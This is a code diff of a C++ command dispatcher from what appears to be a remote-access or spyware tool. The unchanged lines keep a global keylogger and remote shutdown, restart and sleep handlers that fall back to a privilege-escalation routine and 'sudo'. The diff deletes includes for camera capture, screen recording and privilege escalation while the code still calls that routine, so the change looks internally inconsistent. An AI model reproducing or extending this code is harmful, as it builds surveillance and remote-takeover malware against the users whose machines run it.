@@ -1,8 +1,4 @@
 #include "CommandDispatcher.hpp"
-#include "CameraCapture.h"
-#include "ScreenRecorder.h"
-#include "CaptureScreen.h"
-#include "PrivilegeEscalation.h"
 
 static Keylogger g_keylogger;
 static std::atomic<bool> g_isKeylogging(false);
@@ -501,20 +497,16 @@ void CommandDispatcher::registerHandlers() {
             #ifdef _WIN32
                 system("shutdown /s /t 0");
             #elif __APPLE__
-                // Method 1: osascript
                 int result = system("osascript -e 'tell application \"System Events\" to shut down'");
                 if (result != 0) {
-                    // Method 2: PrivilegeEscalation
                     std::string shutdownResult = PrivilegeEscalation::executeWithPrivileges("shutdown -h now");
                     if (shutdownResult.empty()) {
-                        // Method 3: sudo fallback
                         system("sudo shutdown -h now");
                     }
                 }
             #elif __linux__
                 int result = system("systemctl poweroff");
                 if (result != 0) {
-                    // Fallback: PrivilegeEscalation
                     PrivilegeEscalation::executeWithPrivileges("systemctl poweroff");
                 }
             #endif
@@ -538,20 +530,16 @@ void CommandDispatcher::registerHandlers() {
             #ifdef _WIN32
                 system("shutdown /r /t 0");
             #elif __APPLE__
-                // Method 1: osascript
                 int result = system("osascript -e 'tell application \"System Events\" to restart'");
                 if (result != 0) {
-                    // Method 2: PrivilegeEscalation
                     std::string restartResult = PrivilegeEscalation::executeWithPrivileges("shutdown -r now");
                     if (restartResult.empty()) {
-                        // Method 3: sudo fallback
                         system("sudo shutdown -r now");
                     }
                 }
             #elif __linux__
                 int result = system("systemctl reboot");
                 if (result != 0) {
-                    // Fallback: PrivilegeEscalation
                     PrivilegeEscalation::executeWithPrivileges("systemctl reboot");
                 }
             #endif
@@ -575,20 +563,16 @@ void CommandDispatcher::registerHandlers() {
             #ifdef _WIN32
                 system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
             #elif __APPLE__
-                // Method 1: pmset
                 int result = system("pmset sleepnow");
                 if (result != 0) {
-                    // Method 2: osascript
                     result = system("osascript -e 'tell application \"System Events\" to sleep'");
                     if (result != 0) {
-                        // Method 3: PrivilegeEscalation
                         PrivilegeEscalation::executeWithPrivileges("pmset sleepnow");
                     }
                 }
             #elif __linux__
                 int result = system("systemctl suspend");
                 if (result != 0) {
-                    // Fallback: PrivilegeEscalation
                     PrivilegeEscalation::executeWithPrivileges("systemctl suspend");
                 }
             #endif
